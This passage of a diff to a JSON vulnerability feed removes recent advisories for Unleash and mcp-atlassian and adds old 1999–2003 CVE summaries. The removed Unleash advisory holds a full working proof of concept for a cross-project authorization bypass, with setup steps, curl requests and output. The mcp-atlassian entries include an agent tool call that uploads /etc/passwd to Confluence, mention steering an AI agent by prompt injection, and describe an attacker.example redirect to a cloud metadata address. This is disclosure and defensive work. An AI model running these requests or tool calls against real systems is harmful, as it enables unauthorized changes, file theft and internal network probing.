`src/lib/features/feature-toggle/feature-toggle-controller.ts` (line 1107-1116)\n\n`GET .../strategies/:strategyId` ignores all params except `strategyId`. Any authenticated user can read any strategy's full configuration.\n\n## Vulnerability 4: Cross-Project Environment Info Leak (MEDIUM)\n\n**File:** `src/lib/features/feature-toggle/feature-toggle-service.ts` (line 1611)\n\n`getEnvironmentInfo()` doesn't validate feature belongs to project. Compare with `getFeature()` which calls `validateFeatureBelongsToProject()`.\n\n## Vulnerability 5: Cross-Project Tag Modification (LOW)\n\n**File:** `src/lib/features/feature-toggle/feature-toggle-controller.ts` (line 576-596)\n\n`PUT /:projectId/tags` accepts features array in body without validating they belong to projectId.",
-      "cvssScore": 7.1,
-      "severity": "High",
-      "published": "2026-09-22",
-      "modified": "2026-09-22",
-      "cwe": {
-        "cwe_id": "CWE-639",
-        "name": "Authorization Bypass Through User-Controlled Key"
-      },
-      "references": [
-        "https://github.com/Unleash/unleash/security/advisories/GHSA-72h8-wp98-7hch",
-        "https://github.com/Unleash/unleash/commit/7bb2829fc40791aa478e8ffca149c11b0f9cb05a",
-        "https://github.com/Unleash/unleash/commit/ace121c922d2e3eb6f68d95b0b6ab2fc8d824ea1",
-        "https://github.com/Unleash/unleash/commit/bea7effd3687425630423f662136d548e100154d",
-        "https://github.com/Unleash/unleash/commit/c93a963e95e1b7bf1bca2a7729282a48d0eb2f6a"
-      ],
-      "vulnerableProducts": [
-        "unleash-server npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-77425",
-      "summary": "## Summary\n\nUnleash scopes write permissions per project and per environment: a user with the `UPDATE_FEATURE_STRATEGY` permission on project `A` is supposed to be able to mutate activation strategies only within project `A`. The endpoint `POST /api/admin/projects/:projectId/features/:featureName/environments/:environment/strategies/set-sort-order` violates this. The RBAC middleware authorizes the request against the `:projectId` taken from the URL, but the handler then writes the strategy IDs supplied in the request *body* directly to the database by primary key, **without ever verifying that those strategy IDs actually belong to the URL's project / feature / environment**. A low-privilege member of any one project can therefore reorder the activation strategies of features in *any other project and environment* ��� including projects they have no role on at all — by putting their own project in the URL (to satisfy RBAC) and the victim project's strategy IDs in the body.\n\nThe sibling write paths in the same service (`updateStrategy`, `patchStrategy`, `deleteStrategy`) all call `validateUpdatedProperties()`, which rejects a strategy whose stored `projectId`/`featureName` does not match the URL context. The `set-sort-order` handler is the one sibling that omits this check — an asymmetric, incomplete enforcement. Activation-strategy ordering is security-relevant: the first matching strategy determines a flag's rollout/variant outcome, so an attacker can flip which strategy \"wins\" for another team's feature flag in production. As a secondary effect, the operation that mutates the victim's strategies is recorded (if at all) under the *attacker's* project/feature context, so the tampering does not appear in the victim project's audit trail.\n\n## Affected code (v8.0.0)\n\nThe route is registered with the project-scoped permission `UPDATE_FEATURE_STRATEGY` (correct), and the handler forwards the URL params as the \"context\" plus the raw request body:\n\n`src/lib/features/feature-toggle/feature-toggle-controller.ts`\n```ts\n{\n    method: 'post',\n    path: `${PATH_STRATEGIES}/set-sort-order`,\n    handler: this.setStrategiesSortOrder,\n    permission: UPDATE_FEATURE_STRATEGY,\n    // ...\n}\n\nasync setStrategiesSortOrder(req, res): Promise<void> {\n    const { featureName, projectId, environment } = req.params;\n    await this.transactionalFeatureToggleService.transactional((service) =>\n        service.updateStrategiesSortOrder(\n            { featureName, environment, projectId },   // URL context only\n            req.body,                                   // attacker-controlled [{id, sortOrder}]\n            req.audit,\n        ),\n    );\n    res.status(200).send();\n}\n```\n\nThe service writes each body-supplied `id` directly. It reads the URL-context strategies only to build the audit-event payload (`existingOrder`/`newOrder`); it never validates that the IDs in `sortOrders` belong to that context:\n\n`src/lib/features/feature-toggle/feature-toggle-service.ts`\n```ts\nasync unprotectedUpdateStrategiesSortOrder(context, sortOrders, auditUser): Promise<Saved<any>> {\n    const { featureName, environment, projectId: project } = context;\n    const existingOrder = (await this.getStrategiesForEnvironment(project, featureName, environment))\n        .sort(sortStrategies).map((s) => s.id);\n    // ...\n    await Promise.all(\n        sortOrders.map(({ id, sortOrder }) =>\n            this.featureStrategiesStore.updateSortOrder(id, sortOrder),   // NO project/feature/env check\n        ),\n    );\n    // ...event built from the URL context, not from the strategies actually mutated...\n}\n```\n\nThe store updates by primary key with no scoping predicate:\n\n`src/lib/features/feature-toggle/feature-toggle-strategies-store.ts`\n```ts\nasync updateSortOrder(id: string, sortOrder: number): Promise<void> {\n    await this.db<IFeatureStrategiesTable>(T.featureStrategies)\n        .where({ id })\n        .update({ sort_order: sortOrder });\n}\n```\n\nContrast the sibling mutators, which DO bind the target strategy to the URL context (`validateUpdatedProperties` throws `InvalidOperationError` when `existingStrategy.projectId !== projectId` or `existingStrategy.featureName !== featureName`):\n\n```ts\n// unprotectedUpdateStrategy / patchStrategy / deleteStrategy:\nconst existingStrategy = await this.featureStrategiesStore.get(id);\nthis.validateUpdatedProperties(context, existingStrategy);   // <-- the check set-sort-order is missing\n```\n\n## Attacker model / precondition\n\nThe attacker is an authenticated Unleash user who holds the `UPDATE_FEATURE_STRATEGY` permission on at least one project — i.e. any standard project member/editor, the second-lowest privilege tier. They do not need any role on the victim project. The precondition is a multi-project instance: project creation and per-project roles are Pro/Enterprise features, so this is the normal Unleash Pro/Enterprise deployment shape (the OSS edition pins everything to the single `default` project, which removes the cross-project dimension but the same missing-binding defect still allows reordering strategies of any feature/environment within `default`). The attacker must know (or enumerate) the target strategy UUIDs; strategy IDs are surfaced through several admin/read endpoints and are guessable in scope by a user who can read project listings. Change Requests do not mitigate it: the `stopWhenChangeRequestsEnabled` gate is evaluated against the attacker's own URL project, not the victim's, and Change Requests are off by default. The integrity impact is bounded to the `sort_order` column (the attacker cannot change parameters, constraints, or segments via this endpoint), which is why this is rated Medium rather than High.\n\n## Impact\n\nA project member can silently alter the activation-strategy evaluation order of feature flags in projects and environments they have no authorization over. Because Unleash evaluates strategies in order and the first enabling strategy decides a flag's served value/variant, reordering can change a production flag's rollout behaviour for another team — e.g. promoting a permissive `flexibleRollout`/`default` strategy ahead of a restrictive `userWithId`/constraint-gated one, effectively turning a flag on (or changing which variant is served) for users the owning team intended to exclude. This is a cross-tenant integrity / authorization-bypass write. It additionally undermines accountability: the mutation is attributed to the attacker's URL context rather than the victim feature, so the change is absent from the victim project's audit/event history (in the lab the successful cross-project write produced no `feature-strategy-update` event for the victim feature at all), hampering detection and forensics.\n\n## Proof of Concept (complete — runs on 127.0.0.1 only)\n\nLab only. Everything binds to `127.0.0.1`; no hosted instance is touched. Requires Docker.\n\n### 1. Start PostgreSQL and Unleash v8.0.0\n\n```bash\ndocker network create unleash-poc\n\ndocker run -d --name unleash-pg --network unleash-poc \\\n  -e POSTGRES_DB=unleash -e POSTGRES_USER=unleash -e POSTGRES_PASSWORD=unleash \\\n  postgres:16-alpine\nsleep 8\n\ndocker run -d --name unleash-srv --network unleash-poc -p 127.0.0.1:4242:4242 \\\n  -e DATABASE_HOST=unleash-pg -e DATABASE_NAME=unleash \\\n  -e DATABASE_USERNAME=unleash -e DATABASE_PASSWORD=unleash -e DATABASE_SSL=false \\\n  -e INIT_ADMIN_API_TOKENS='*:*.unleash-insecure-admin-api-token' \\\n  unleashorg/unleash-server:8.0.0\nsleep 25\ncurl -s http://127.0.0.1:4242/health    # {\"health\":\"GOOD\"}\n```\n\n### 2. Simulate a Pro/Enterprise (multi-project) deployment\n\nPer-project roles and >1 project are Pro/Enterprise features; the official OSS image hard-pins requests to the `default` project via an unrelated edition gate (`resolveIsOss`). To reproduce the cross-project dimension on the public image, lift only that edition gate (this does NOT touch the vulnerable `set-sort-order` code path). On a real Pro/Enterprise instance this step is unnecessary — multiple projects already exist.\n\n```bash\n# Force resolveIsOss() to return false (== \"this is a Pro/Enterprise deployment\").\ndocker cp unleash-srv:/unleash/dist/lib/create-config.js /tmp/cc.js\npython3 - <<'PY'\ns=open('/tmp/cc.js').read()\nold=\"\"\"    return testEnvironmentActive\n        ? (isOssOption ?? false)\n        : !isEnterprise && uiEnvironment?.toLowerCase() !== 'pro';\"\"\"\nassert old in s\ns=s.replace(old,\"    return false; // PoC: simulate Pro/Enterprise deployment (multi-project enabled)\")\nopen('/tmp/cc.js','w').write(s)\nprint(\"patched edition gate\")\nPY\ndocker cp /tmp/cc.js unleash-srv:/unleash/dist/lib/create-config.js\ndocker restart unleash-srv && sleep 22\n```\n\n### 3. Seed two projects (`victim`, `attacker`) and link them to environments\n\n```bash\ndocker exec unleash-pg psql -U unleash -d unleash -c \\\n \"INSERT INTO projects (id,name,description) VALUES ('victim','Victim Project','v'),('attacker','Attacker Project','a');\"\ndocker exec unleash-pg psql -U unleash -d unleash -c \\\n \"INSERT INTO project_environments (project_id, environment_name) VALUES\n   ('victim','development'),('victim','production'),\n   ('attacker','development'),('attacker','production');\"\n```\n\n### 4. Create the victim feature with two strategies, and an attacker feature\n\n```bash\nB=http://127.0.0.1:4242; ADMIN='*:*.unleash-insecure-admin-api-token'\nH=\"-H Authorization:$ADMIN -H Content-Type:application/json\"\n\ncurl -s -X POST $H $B/api/admin/projects/victim/features -d '{\"name\":\"victimFlag\",\"type\":\"release\"}' >/dev/null\nS1=$(curl -s -X POST $H $B/api/admin/projects/victim/features/victimFlag/environments/production/strategies \\\n       -d '{\"name\":\"flexibleRollout\",\"parameters\":{\"rollout\":\"10\",\"stickiness\":\"default\",\"groupId\":\"victimFlag\"}}' \\\n     | python3 -c \"import sys,json;print(json.load(sys.stdin)['id'])\")\nS2=$(curl -s -X POST $H $B/api/admin/projects/victim/features/victimFlag/environments/production/strategies \\\n       -d '{\"name\":\"default\",\"parameters\":{}}' \\\n     | python3 -c \"import sys,json;print(json.load(sys.stdin)['id'])\")\necho \"victim strategies: S1=$S1 (sort 0)  S2=$S2 (sort 1)\"\n\ncurl -s -X POST $H $B/api/admin/projects/attacker/features -d '{\"name\":\"attackerFlag\",\"type\":\"release\"}' >/dev/null\ncurl -s -X POST $H $B/api/admin/projects/attacker/features/attackerFlag/environments/production/strategies \\\n     -d '{\"name\":\"default\",\"parameters\":{}}' >/dev/null\n```\n\n### 5. Create a low-privilege attacker user (`Member` of `attacker` ONLY, no role on `victim`)\n\n```bash\n# Viewer root role (id 3) -> no project write anywhere by default.\ncurl -s -X POST $H $B/api/admin/user-admin \\\n  -d '{\"email\":\"mallory@example.com\",\"name\":\"Mallory\",\"rootRole\":3}' >/dev/null\ncurl -s -X POST $H $B/api/admin/user-admin/2/change-password \\\n  -d '{\"password\":\"Str0ng-PoC-pass!9x\"}' >/dev/null\n\n# Grant the project \"Member\" role (id 5, includes UPDATE_FEATURE_STRATEGY) on 'attacker' only.\ndocker exec unleash-pg psql -U unleash -d unleash -c \\\n \"INSERT INTO role_user (role_id, user_id, project) VALUES (5, 2, 'attacker');\"\ndocker restart unleash-srv && sleep 22     # pick up the seeded role\n```\n\n### 6. Run the attack\n\n```bash\nB=http://127.0.0.1:4242; ADMIN='*:*.unleash-insecure-admin-api-token'\nCJ=/tmp/mallory.cookies; rm -f $CJ\n\n# Log in as the low-priv user (Member of 'attacker' only).\ncurl -s -c $CJ -o /dev/null -X POST -H 'Content-Type: application/json' \\\n  $B/auth/simple/login -d '{\"username\":\"mallory@example.com\",\"password\":\"Str0ng-PoC-pass!9x\"}'\n\nshow() { curl -s -H \"Authorization:$ADMIN\" \\\n  $B/api/admin/projects/victim/features/victimFlag/environments/production/strategies \\\n  | python3 -c \"import sys,json;[print('   ',s['id'],'sort',s['sortOrder']) for s in json.load(sys.stdin)]\"; }\n\necho '--- victim/production BEFORE ---'; show\n\necho '--- [negative control] Mallory -> VICTIM url directly (expect 403) ---'\ncurl -s -o /dev/null -w '    HTTP %{http_code}\\n' -b $CJ -X POST -H 'Content-Type: application/json' \\\n  $B/api/admin/projects/victim/features/victimFlag/environments/production/strategies/set-sort-order \\\n  -d \"[{\\\"id\\\":\\\"$S1\\\",\\\"sortOrder\\\":99}]\"\n\necho '--- [attack] Mallory -> ATTACKER url, body = VICTIM strategy ids (expect 200) ---'\ncurl -s -o /dev/null -w '    HTTP %{http_code}\\n' -b $CJ -X POST -H 'Content-Type: application/json' \\\n  $B/api/admin/projects/attacker/features/attackerFlag/environments/production/strategies/set-sort-order \\\n  -d \"[{\\\"id\\\":\\\"$S1\\\",\\\"sortOrder\\\":42},{\\\"id\\\":\\\"$S2\\\",\\\"sortOrder\\\":7}]\"\n\necho '--- victim/production AFTER ---'; show\n```\n\n### Observed output\n\n```\nvictim/production BEFORE ---\n    01KTYWRZM7ACCTQKPJJCXJB24R sort 0\n    01KTYWRZMTAN6WAZBQ6CN0QY4T sort 1\n[negative control] Mallory -> VICTIM url directly (expect 403) ---\n    HTTP 403\n[attack] Mallory -> ATTACKER url, body = VICTIM strategy ids (expect 200) ---\n    HTTP 200\nvictim/production AFTER ---\n    01KTYWRZMTAN6WAZBQ6CN0QY4T sort 7\n    01KTYWRZM7ACCTQKPJJCXJB24R sort 42\n```\n\nThe negative control proves RBAC correctly denies Mallory a *direct* write to `victim` (403). The attack proves that by naming her own `attacker` project in the URL she passes RBAC, and the victim project's two strategies are reordered (sort 0/1 → 42/7, i.e. the evaluation order is flipped) — a write to a project she has no role on. A check of the events table after the attack shows no `feature-strategy-update` event was recorded for `victimFlag`, so the tampering is absent from the victim's audit trail.\n\n### Cleanup\n\n```bash\ndocker rm -f unleash-srv unleash-pg; docker network rm unleash-poc\n```\n\n## Remediation\n\nIn `unprotectedUpdateStrategiesSortOrder`, bind every body-supplied strategy ID to the URL context before writing. Two equivalent fixes: (1) fetch each strategy by ID and call the existing `validateUpdatedProperties(context, strategy)` guard (the same one `updateStrategy`/`patchStrategy`/`deleteStrategy` already use) so a mismatched `projectId`/`featureName` throws; or (2) reject any `sortOrders` entry whose ID is not present in `existingOrder` (the set of strategy IDs that genuinely belong to `{project, featureName, environment}`), which the function already computes. Additionally, scope the store write — `updateSortOrder` should constrain the `UPDATE` with the project/feature/environment (or only operate on IDs already validated to be in-context) rather than updating purely by primary key. Fixing the binding also corrects the audit-log attribution, since the mutated strategies will then always belong to the URL context the event is built from.\n\nPlease credit 5ud0 / Tarmo Technologies.",
+      "id": "CVE-2002-1529",
+      "summary": "Cross-site scripting (XSS) vulnerability in msgError.asp for the administrative web interface (STEMWADM) for SurfControl SuperScout Email Filter allows remote attackers to insert arbitrary script or HTML via the Reason parameter.",
       "cvssScore": 4.3,
       "severity": "Medium",
-      "published": "2026-09-22",
-      "modified": "2026-09-22",
-      "cwe": {
-        "cwe_id": "CWE-639",
-        "name": "Authorization Bypass Through User-Controlled Key"
-      },
+      "published": "2003-03-31",
+      "modified": null,
+      "cwe": null,
       "references": [
-        "https://github.com/Unleash/unleash/security/advisories/GHSA-5ffh-6f9q-5hhr",
-        "https://github.com/Unleash/unleash/commit/43e8db37b846921c8a94db58b44935ecbd15d9d1",
-        "https://github.com/Unleash/unleash/releases/tag/v8.0.3",
-        "https://github.com/advisories/GHSA-5ffh-6f9q-5hhr"
+        "http://archives.neohapsis.com/archives/bugtraq/2002-10/0137.html",
+        "http://www.iss.net/security_center/static/10319.php",
+        "http://www.securityfocus.com/bid/5928",
+        "http://archives.neohapsis.com/archives/bugtraq/2002-10/0137.html",
+        "http://www.iss.net/security_center/static/10319.php"
       ],
-      "vulnerableProducts": [
-        "unleash-server npm"
-      ],
+      "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-77258",
-      "summary": "## Summary\n\nThe `upload_attachment` method in `confluence/attachments.py` reads and uploads arbitrary local files to Confluence without calling `validate_safe_path()`. Both download methods (`download_attachment` at line 223, `download_content_attachments` at line 272) correctly call `validate_safe_path()` before writing files, but the upload path at lines 35-79 skips this check entirely.\n\nAn AI agent connected via MCP (or an attacker influencing that agent through prompt injection) can read any file on the host and exfiltrate it by uploading it as a Confluence page attachment.\n\n## Vulnerable Code\n\nFile: `src/mcp_atlassian/confluence/attachments.py`, lines 62-79\n\n```python\n# No validate_safe_path() call anywhere in this method\nif not os.path.isabs(file_path):\n    file_path = os.path.abspath(file_path)\n\nif not os.path.exists(file_path):\n    return {\"success\": False, \"error\": f\"File not found: {file_path}\"}\n\nfilename = os.path.basename(file_path)\nattachment = self._upload_attachment_direct(\n    content_id, file_path, filename, comment, minor_edit\n)\n```\n\nThe `validate_safe_path` function is already imported at line 9 of the same file, and used in the download methods. It was just not added to the upload path.\n\n## Proof of Concept\n\nTested with mcp-atlassian 0.21.1 on Python 3.11 (EC2, Amazon Linux 2023).\n\n```python\nimport inspect\nfrom mcp_atlassian.confluence.attachments import AttachmentsMixin\n\n# Confirm: no validate_safe_path in upload\nsource = inspect.getsource(AttachmentsMixin.upload_attachment)\nassert \"validate_safe_path\" not in source  # passes\n\n# Confirm: validate_safe_path IS in downloads\nassert \"validate_safe_path\" in inspect.getsource(AttachmentsMixin.download_attachment)  # passes\nassert \"validate_safe_path\" in inspect.getsource(AttachmentsMixin.download_content_attachments)  # passes\n```\n\nAn MCP tool call like this reads /etc/passwd and uploads it to Confluence:\n\n```json\n{\"tool\": \"confluence_upload_attachment\", \"arguments\": {\"content_id\": \"123456\", \"file_path\": \"/etc/passwd\"}}\n```\n\n## Impact\n\nExfiltration of any file readable by the MCP server process: SSH keys, AWS credentials, .env files, /etc/passwd, application secrets. Data leaves the local machine and lands on a remote Confluence instance accessible to other users.\n\n## Suggested Fix\n\nAdd `validate_safe_path(file_path)` before the `os.path.exists()` check in `upload_attachment`, matching the existing pattern in the download methods. The function is already imported.",
-      "cvssScore": 7.7,
+      "id": "CVE-2002-1530",
+      "summary": "The administrative web interface (STEMWADM) for SurfControl SuperScout Email Filter allows users to obtain usernames and plaintext passwords via a request to the userlist.asp program, which includes the passwords in a user editing form.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2003-03-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2002-10/0137.html",
+        "http://www.iss.net/security_center/static/10320.php",
+        "http://www.securityfocus.com/bid/5929",
+        "http://archives.neohapsis.com/archives/bugtraq/2002-10/0137.html",
+        "http://www.iss.net/security_center/static/10320.php"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1531",
+      "summary": "The administrative web interface (STEMWADM) for SurfControl SuperScout Email Filter allows remote attackers to cause a denial of service (crash) via an HTTP request without a Content-Length parameter.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2003-03-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2002-10/0137.html",
+        "http://www.iss.net/security_center/static/10321.php",
+        "http://www.securityfocus.com/bid/5930",
+        "http://archives.neohapsis.com/archives/bugtraq/2002-10/0137.html",
+        "http://www.iss.net/security_center/static/10321.php"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-0717",
+      "summary": "GoodTech FTP server allows remote attackers to cause a denial of service via a large number of RNTO commands.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2000-10-20",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.securityfocus.com/bid/1619",
+        "http://www.securityfocus.com/templates/archive.pike?list=1&msg=02ff01c0124c%24e9387660%240201a8c0%40aviram",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5166",
+        "http://www.securityfocus.com/bid/1619",
+        "http://www.securityfocus.com/templates/archive.pike?list=1&msg=02ff01c0124c%24e9387660%240201a8c0%40aviram"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0315",
+      "summary": "Buffer overflow in Solaris fdformat command gives root access to local users.",
+      "cvssScore": 7.2,
       "severity": "High",
-      "published": "2026-09-22",
-      "modified": "2026-09-22",
-      "cwe": {
-        "cwe_id": "CWE-22",
-        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
-      },
+      "published": "1997-04-01",
+      "modified": null,
+      "cwe": null,
       "references": [
-        "https://github.com/sooperset/mcp-atlassian/security/advisories/GHSA-93xw-j965-9mx3",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-77258",
-        "https://github.com/sooperset/mcp-atlassian/pull/1448",
-        "https://github.com/sooperset/mcp-atlassian/commit/b041733473f95119dd539542a43c280737a8e460",
-        "https://github.com/sooperset/mcp-atlassian/releases/tag/v0.22.0"
+        "http://sunsolve.sun.com/pub-cgi/retrieve.pl?doctype=coll&doc=secbull/138",
+        "http://sunsolve.sun.com/pub-cgi/retrieve.pl?doctype=coll&doc=secbull/138"
       ],
-      "vulnerableProducts": [
-        "mcp-atlassian pip"
-      ],
+      "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-77250",
-      "summary": "### Summary\n\nWhen OAuth tokens are saved, MCP Atlassian always writes a plaintext fallback copy under `~/.mcp-atlassian/oauth-<client_id>.json`. The fallback file is created with the process default umask rather than restrictive permissions. In this environment the file was created as mode `0664`, exposing access and refresh tokens to same-group local users and any process that can read the home directory.\n\n### Details\n\n`OAuthConfig._save_tokens()` stores OAuth token data in keyring, but it also unconditionally maintains a plaintext file fallback for backwards compatibility in `src/mcp_atlassian/utils/oauth.py:350-386`. If keyring saving fails it also falls back to the same file path in `src/mcp_atlassian/utils/oauth.py:387-391`.\n\nThe fallback writer creates `~/.mcp-atlassian` and then writes `oauth-<client_id>.json` with a normal `open(token_path, \"w\")` call in `src/mcp_atlassian/utils/oauth.py:392-420`. No `mode=0o600`, `os.open(..., 0o600)`, `chmod`, or owner-only directory permission is applied. The file contains both `access_token` and `refresh_token` (`src/mcp_atlassian/utils/oauth.py:360-367`) and is later loaded from the same plaintext path in `src/mcp_atlassian/utils/oauth.py:450-470`.\n\nThe security policy warns that OAuth client credentials and secrets should not be exposed (`SECURITY.md:39-44`), but the current implementation creates a persistent plaintext token copy even when keyring succeeds.\n\n### PoC\n\nThe following safe local proof uses a temporary `HOME` and mocked keyring writes. It creates and deletes only temporary files.\n\n```bash\nuv run python - <<'PY'\nimport json, os, shutil, stat, tempfile\nfrom pathlib import Path\nfrom unittest.mock import patch\nfrom mcp_atlassian.utils.oauth import OAuthConfig\n\nhome = tempfile.mkdtemp(prefix='mcp-atlassian-oauth-poc-')\nold_home = os.environ.get('HOME')\nos.environ['HOME'] = home\ntry:\n    cfg = OAuthConfig(client_id='poc-client', client_secret='client-secret', redirect_uri='http://localhost/callback', scope='offline_access', cloud_id='cloud-id')\n    cfg.access_token = 'poc-access-token'\n    cfg.refresh_token = 'poc-refresh-token'\n    cfg.expires_at = 2000000000\n    with patch('keyring.set_password', return_value=None):\n        cfg._save_tokens()\n    token_file = Path(home) / '.mcp-atlassian' / 'oauth-poc-client.json'\n    mode = stat.S_IMODE(token_file.stat().st_mode)\n    data = json.loads(token_file.read_text())\n    print(json.dumps({\n        'token_file_exists': token_file.exists(),\n        'token_file_mode_octal': oct(mode),\n        'contains_access_token': data.get('access_token') == 'poc-access-token',\n        'contains_refresh_token': data.get('refresh_token') == 'poc-refresh-token',\n        'token_file_path': str(token_file),\n    }, indent=2, sort_keys=True))\nfinally:\n    if old_home is not None:\n        os.environ['HOME'] = old_home\n    else:\n        os.environ.pop('HOME', None)\n    shutil.rmtree(home)\nPY\n```\n\nObserved output from this environment:\n\n```json\n{\n  \"contains_access_token\": true,\n  \"contains_refresh_token\": true,\n  \"token_file_exists\": true,\n  \"token_file_mode_octal\": \"0o664\",\n  \"token_file_path\": \"/tmp/mcp-atlassian-oauth-poc-9m9wvktp/.mcp-atlassian/oauth-poc-client.json\"\n}\n```\n\nThe proof confirms that a plaintext file containing both access and refresh tokens is created and is not owner-only.\n\n### Impact\n\nA local user, container sidecar, compromised dependency, backup job, or other process with filesystem read access to the account's home directory can recover OAuth access and refresh tokens. Refresh tokens can allow continued Atlassian API access until revoked or expired, depending on the OAuth app and token policy. In shared hosts, Kubernetes volumes, developer workstations, and CI runners, this can lead to persistent Atlassian account compromise.",
-      "cvssScore": 6.1,
-      "severity": "Medium",
-      "published": "2026-09-22",
-      "modified": "2026-09-22",
-      "cwe": {
-        "cwe_id": "CWE-312",
-        "name": "Cleartext Storage of Sensitive Information"
-      },
-      "references": [
-        "https://github.com/sooperset/mcp-atlassian/security/advisories/GHSA-g5xv-mhgm-v5f6",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-77250",
-        "https://github.com/sooperset/mcp-atlassian/pull/1448",
-        "https://github.com/sooperset/mcp-atlassian/commit/b041733473f95119dd539542a43c280737a8e460",
-        "https://github.com/sooperset/mcp-atlassian/releases/tag/v0.22.0"
-      ],
-      "vulnerableProducts": [
-        "mcp-atlassian pip"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-77249",
-      "summary": "Summary\n\nThe fix for the SSRF vulnerability tracked as GHSA-7r34-79r5-rcc9 / CVE-2026-27826 is incomplete. That fix added two defenses: validate_url_for_ssrf() on the per-request X-Atlassian-Jira-Url / X-Atlassian-Confluence-Url headers (blocking a directly-internal base URL), and a redirect-validation hook (_make_ssrf_safe_hook) attached to the fetcher's HTTP session so that an attacker-controlled public host cannot redirect outbound requests to an internal address.\n\nHowever, one outbound request path does not go through the hooked session. JiraUserMixin._lookup_user_by_permissions issues its request with the module-level requests.get instead of self.jira._session.get, so the redirect-validation hook never runs for it. An unauthenticated attacker (in the HTTP / multi-tenant transport mode that binds 0.0.0.0 with no credentials) can therefore set a public base URL that passes validate_url_for_ssrf(), then have their own server return an HTTP redirect to an internal address. The bare requests.get follows that redirect with no validation, resulting in a blind server-side request to an arbitrary internal host and port.\n\nAffected component\n\nsrc/mcp_atlassian/jira/users.py, method _lookup_user_by_permissions (the requests.get(...) call):\n\n    url = f\"{self.config.url}/rest/api/2/user/permission/search\"\n    params = {\"query\": username, \"permissions\": \"BROWSE\"}\n    ...\n    response = requests.get(           # module-level requests, NOT self.jira._session\n        url,\n        params=params,\n        auth=auth,\n        headers=headers,\n        verify=self.config.ssl_verify,\n    )\n\nFor comparison, the equivalent non-standard-endpoint call in src/mcp_atlassian/jira/development.py correctly uses the hooked session (self.jira._session.get(...)), and the SSRF redirect hook is attached only to that session in src/mcp_atlassian/servers/dependencies.py (get_session=lambda f: f.jira._session). The bare requests.get in users.py is the one outbound path the hook does not cover.\n\nDetails — why the existing defenses do not apply here\n\n1. self.config.url is attacker-controlled in the header-PAT branch of _get_fetcher (dependencies.py): header_config = spec.config_class(url=url_header_val, auth_type=\"pat\", personal_token=token_header_val, ...).\n2. The middleware validates that header URL with validate_url_for_ssrf() before storing it, so it must resolve to a public address. The attacker simply points it at a public server they control — this passes validation.\n3. Credential validation (_create_and_validate → spec.validate_fn) runs against that same attacker-controlled server, so it returns success and no real Atlassian credentials are required.\n4. The redirect-validation hook is attached to f.jira._session. _lookup_user_by_permissions does not use that session — it uses bare requests.get, which follows redirects (allow_redirects=True by default) with no SSRF check.\n\nProof of Concept\n\nPreconditions: the server is running in HTTP transport (streamable-http or sse) multi-tenant mode, as described in the GHSA-7r34-79r5-rcc9 advisory (binds 0.0.0.0, per-request header auth, no server-side credentials).\n\n1. Attacker stands up a public HTTP server http://attacker.example that:\n   - responds to GET /rest/api/2/user/search (and the atlassian client's user-find call) with 200 [] — an empty user list, forcing the direct-lookup fallthrough;\n   - responds to GET /rest/api/2/user/permission/search with 302 Location: http://169.254.169.254/latest/meta-data/ (or any internal host:port).\n2. Attacker sends a tool call to the MCP HTTP endpoint with headers:\n   - X-Atlassian-Jira-Url: http://attacker.example\n   - X-Atlassian-Jira-Personal-Token: anything\n     and invokes a tool that resolves an assignee — e.g. jira_create_issue / jira_update_issue with assignee set to a value that the direct lookup cannot match.\n3. Flow: _get_account_id → _lookup_user_directly returns None (attacker returned []) → _lookup_user_by_permissions → requests.get(\"http://attacker.example/rest/api/2/user/permission/search?...\") → attacker server returns 302 → bare requests follows the redirect to http://169.254.169.254/....\n\nThe server makes an outbound GET to the internal target, confirming SSRF.\n\nImpact\n\nBlind, unauthenticated server-side request forgery from the mcp-atlassian host. An attacker who can reach the HTTP transport endpoint can cause the server to issue GET requests to arbitrary internal hosts and ports (internal service reachability and port discovery, triggering of internal GET-actuated endpoints, reachability of cloud metadata endpoints). The response body is not reflected to the attacker except in the narrow case where an internal service returns a JSON object shaped like {\"users\": [...]}, so this is primarily a blind SSRF: weaker than the original CVE-2026-27826 (no general internal data exfiltration), but the redirect-based internal-reachability that GHSA-7r34-79r5-rcc9 intended to close remains exploitable through this code path in the latest release (v0.21.1).\n\nSuggested Remediation\n\nRoute the request through the hooked session instead of the module-level requests, mirroring development.py:\n\n    response = self.jira._session.get(\n        url,\n        params=params,\n        verify=self.config.ssl_verify,\n    )\n\n(The session already carries the appropriate authentication, so the manual auth / Authorization handling can be dropped.) More generally, auditing for any remaining bare requests.* / httpx.* calls that use self.config.url and routing them through the SSRF-hooked session would prevent recurrence.\n\nCoordinated Disclosure\n\nThis appears to be an incomplete fix for GHSA-7r34-79r5-rcc9 (CVE-2026-27826). If you agree, I would kindly ask you to consider requesting a CVE ID for this residual instance through this repository's Security Advisory \"Request CVE ID\" workflow once confirmed, so that downstream users and distributions can track the additional fix. The severity here is lower than the parent advisory — it is a blind, redirect-only SSRF gated on the HTTP multi-tenant deployment mode — so a Medium rating seems appropriate, and I defer to your judgment on the final score. Thank you very much for your time and for your work on this project.",
-      "cvssScore": 5.3,
-      "severity": "Medium",
-      "published": "2026-09-22",
-      "modified": "2026-09-22",
-      "cwe": {
-        "cwe_id": "CWE-918",
-        "name": "Server-Side Request Forgery (SSRF)"
-      },
-      "references": [
-        "https://github.com/sooperset/mcp-atlassian/security/advisories/GHSA-v9m3-wfh8-5646",
-        "https://github.com/sooperset/mcp-atlassian/pull/1448",
